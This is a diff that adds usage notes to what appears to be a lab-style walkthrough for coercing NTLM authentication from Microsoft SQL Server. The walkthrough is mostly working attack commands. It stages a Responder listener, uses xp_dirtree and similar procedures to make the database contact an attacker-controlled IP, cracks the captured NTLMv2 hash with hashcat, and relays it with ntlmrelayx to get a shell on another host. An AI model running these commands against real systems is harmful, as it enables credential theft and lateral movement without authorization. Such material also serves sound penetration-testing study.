@@ -59,6 +59,7 @@ Triggerable by **any** authenticated SQL principal — `xp_dirtree` does not req
 nmap -sV -p1433,445 <target>
 nxc mssql <target> -u <user> -p <pass> -q "SELECT @@version;"
 ```
+> Confirms MSSQL is running and your credentials work before proceeding. Replace `<target>`, `<user>`, and `<pass>` with your target's values. `-q` runs a SQL query non-interactively.
 
 ### 2. Stage the Listener
 
@@ -70,6 +71,7 @@ sudo kill <PID>
 # Listen for inbound SMB auth and capture NTLMv2
 sudo responder -I tun0 -wv
 ```
+> Always free ports 139 and 445 before starting Responder — any conflict silently prevents hash capture. Replace `tun0` with your VPN interface. `-w` enables WPAD, `-v` verbose output.
 
 ### 3. Trigger the Coercion
 
@@ -81,6 +83,7 @@ EXEC master..xp_dirtree '\\10.10.14.5\share\', 1, 1;
 EXEC master..xp_subdirs '\\10.10.14.5\share\';
 EXEC master..xp_fileexist '\\10.10.14.5\share\anything';
 ```
+> Replace `10.10.14.5` with your tun0 IP. The second and third args to xp_dirtree (depth and files flag) can be omitted. Any of the three alternates triggers the SMB auth — pick whichever the target allows.
 
 `impacket-mssqlclient` one-liner from Linux:
 
@@ -89,6 +92,7 @@ impacket-mssqlclient <user>:<pass>@<target> \
   -windows-auth \
   -q "EXEC master..xp_dirtree '\\\\10.10.14.5\\share\\', 1, 1;"
 ```
+> `-q` runs the query non-interactively. Double-escape the backslashes in the shell (`\\\\` becomes `\\` in the SQL string). Replace `<user>:<pass>@<target>` and the attacker IP with your values.
 
 ### 4. Harvest
 
@@ -105,6 +109,7 @@ Save and crack:
 hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
 hashcat -m 5600 mssqlsvc.hash --show
 ```
+> `-m 5600` targets NTLMv2 hashes. After cracking, `--show` displays the plaintext. Replace `mssqlsvc.hash` with the path to your saved hash file.
 
 ### 5. Relay (Alternative to Cracking)
 
@@ -114,6 +119,7 @@ If SMB signing is **not enforced** on a different host where `mssqlsvc` (or what
 sudo impacket-ntlmrelayx -smb2support -t smb://<other-host> -i
 # Then trigger xp_dirtree → relayed session lands on <other-host>
 ```
+> `-smb2support` handles SMBv2. `-t` is the relay target (a different host from the source). `-i` opens an interactive SMB shell on the relay target. Replace `<other-host>` with the target IP that lacks SMB signing.
 
 Goal: obtain admin on a **second** host, then pivot back to the original DB box by reusing harvested credentials (Microsoft killed self-relay).
 
